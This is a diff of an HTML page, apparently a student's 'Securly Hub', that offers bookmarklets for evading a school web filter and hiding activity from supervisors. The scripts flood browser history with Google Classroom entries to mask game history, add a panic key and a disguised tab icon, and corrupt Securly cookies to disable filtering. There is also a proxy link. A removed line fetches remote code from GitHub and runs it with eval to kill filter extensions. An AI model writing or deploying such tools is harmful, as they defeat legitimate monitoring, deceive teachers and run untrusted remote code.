@@ -2,8 +2,8 @@
 <html>
 <head>
     <title>Vens Securly Hub V2.5</title>
-    <!-- 1. UPDATED FAVICON -->
-    <link rel="icon" href="logo.png"> 
+    <!-- FAVICON -->
+    <link rel="icon" type="image/png" href="file:///media/fuse/drivefs-f629606b6ae7fcac2bc4e0f87a9ab85f/root/logo.png">
     
     <style type="text/css">
         body {
@@ -11,20 +11,26 @@
             margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center;
         }
 
-        /* 2. FLOATING LOGO STYLES */
-        .logo-container {
-            position: relative;
+        /* FLOATING LOGO SETUP */
+        .logo-wrapper {
             display: flex;
             flex-direction: column;
             align-items: center;
             margin-bottom: 10px;
         }
-        .floating-img {
-            width: 80px; /* Adjust size as needed */
-            height: auto;
-            filter: drop-shadow(0 0 10px #bc13fe);
-            margin-bottom: -10px; /* Pulls it closer to the title */
-            z-index: 5;
+
+        .floating-logo {
+            width: 120px; /* Size of the V logo */
+            filter: drop-shadow(0 0 15px #bc13fe);
+            /* This trick hides the white background of the image */
+            mix-blend-mode: screen; 
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-12px); }
+            100% { transform: translateY(0px); }
         }
 
         header { text-align: center; padding: 20px; border-bottom: 2px solid #bc13fe; width: 80%; margin-bottom: 30px; }
@@ -39,10 +45,11 @@
     </style>
 </head>
 <body>
+
     <header>
-        <!-- 3. ADDED LOGO ABOVE TITLE -->
-        <div class="logo-container">
-            <img src="logo.png" alt="V Logo" class="floating-img">
+        <div class="logo-wrapper">
+            <!-- LOGO SOURCE FROM YOUR LOCAL DRIVE -->
+            <img src="file:///media/fuse/drivefs-f629606b6ae7fcac2bc4e0f87a9ab85f/root/logo.png" alt="Vens Logo" class="floating-logo">
             <h1>VENS SECURLY HUB</h1>
         </div>
         <div style="color: #888; font-size: 14px;">[REDACTED SYSTEM ACCESS]</div>
@@ -52,24 +59,17 @@
 
     <div class="hub-container">
         
-        <!-- HISTORY FLOODER -->
         <div class="button" style="border-color: #ff00ff;">
             <a href="javascript:(function(){
                 var url='https://classroom.google.com';
-                var num=prompt('How many times to flood history with Classroom? (Recommended: 50-100)', '50');
-                if(num){
-                    for(var i=0; i<parseInt(num); i++){
-                        history.pushState({}, '', url + '#' + Math.random());
-                    }
-                    alert('History Flooded with ' + num + ' entries of Google Classroom.');
-                }
+                var num=prompt('How many times to flood history?', '50');
+                if(num){for(var i=0; i<parseInt(num); i++){history.pushState({}, '', url + '#' + Math.random());}alert('History Flooded.');}
             })();" class="button-text">
                 HISTORY_FLOODER
-                <span class="desc">Spams Classroom URLs to hide game history</span>
+                <span class="desc">Spams Classroom URLs</span>
             </a>
         </div>
 
-        <!-- THE MASTER STEALTH LOADER -->
         <div class="button" style="border-color: #00ff00;">
             <a href="javascript:(function(){
                 window.onkeydown = function(e){ if(e.key.toLowerCase() == 'q') window.location.replace('https://classroom.google.com'); };
@@ -78,41 +78,24 @@
                 link.type = 'image/x-icon'; link.rel = 'shortcut icon';
                 link.href = 'https://ssl.gstatic.com';
                 document.getElementsByTagName('head')[0].appendChild(link);
-                alert('Stealth Active: Panic Key (Q) + Tab Disguised');
             })();" class="button-text">
                 STEALTH_LOADER_V2
-                <span class="desc">DRAG TO BAR: Panic Key + Tab Cloak</span>
+                <span class="desc">Panic Key + Tab Cloak</span>
             </a>
         </div>
 
-        <!-- EAT_CURLY REINFORCED -->
         <div class="button">
             <a href="javascript:(function(){
                 var d = new Date(); d.setTime(d.getTime() + (1000*24*60*60*1000));
                 var exp = 'expires='+d.toUTCString();
                 document.cookie = 'securly_filter=disabled;' + exp + ';path=/;domain=.securly.com';
-                document.cookie = 'securly_user=disabled;' + exp + ';path=/;domain=.securly.com';
                 alert('Securly Cookies Corrupted.');
             })();" class="button-text">
                 EAT_CURLY (V2)
-                <span class="desc">Cookie-based filter disruption</span>
+                <span class="desc">Cookie disruption</span>
             </a>
         </div>
 
-        <!-- QUICK SWITCHER -->
-        <div class="button">
-            <a href="javascript:(function(){
-                var t = prompt('1: Classroom, 2: IXL, 3: iReady');
-                if(t=='1')location.href='https://classroom.google.com';
-                if(t=='2')location.href='https://www.ixl.com';
-                if(t=='3')location.href='https://login.i-ready.com';
-            })();" class="button-text">
-                QUICK_SWITCH
-                <span class="desc">Fast jump to educational sites</span>
-            </a>
-        </div>
-
-        <!-- PROXIES & UNBLOCKERS -->
         <div class="button">
             <a href="https://shuttle.rip" target="_blank" class="button-text">
                 SHUTTLE_PROXY
@@ -120,25 +103,9 @@
             </a>
         </div>
 
-        <div class="button">
-            <a href="https://3kh0.github.io" target="_blank" class="button-text">
-                3KH0_HUB
-                <span class="desc">Library of GitHub-hosted games</span>
-            </a>
-        </div>
-
-        <!-- LTBEEF GUI -->
-        <div class="button">
-            <a href="javascript:fetch('https://raw.githubusercontent.com').then(d=>d.text()).then(eval)" class="button-text">
-                KILL_EXTENSIONS
-                <span class="desc">LtbEEF GUI to disable filters</span>
-            </a>
-        </div>
-
     </div>
 
     <script>
-        /* Local Panic for the Hub */
         window.addEventListener('keydown', function(e) {
             if (e.key.toLowerCase() === 'q') window.location.replace('https://classroom.google.com');
         });
